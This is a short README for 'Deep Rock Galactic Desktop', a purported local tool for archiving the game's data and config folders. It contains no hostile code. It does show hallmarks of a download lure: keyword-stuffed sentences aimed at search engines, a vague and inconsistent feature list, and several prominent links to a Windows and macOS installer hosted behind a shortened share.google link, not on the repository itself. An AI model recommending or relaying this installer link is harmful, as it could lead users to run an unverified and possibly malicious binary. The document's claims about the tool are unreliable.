![Deep Rock Galactic Desktop](assets/hero.png)

# Deep Rock Galactic Desktop

*Keep the Deep Rock Galactic data folder tidy before an update.*

## About

**Deep Rock Galactic Desktop** runs on your own PC. A local helper for Deep Rock Galactic data folders, config and export files, and photo albums on Windows and macOS.

Deep Rock Galactic drops data files next to launcher caches.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## Highlights

- Finds the Deep Rock Galactic data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Deep Rock Galactic desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/kathleenmorris666/deep-rock-galactic-desktop

MIT license. See `LICENSE`.
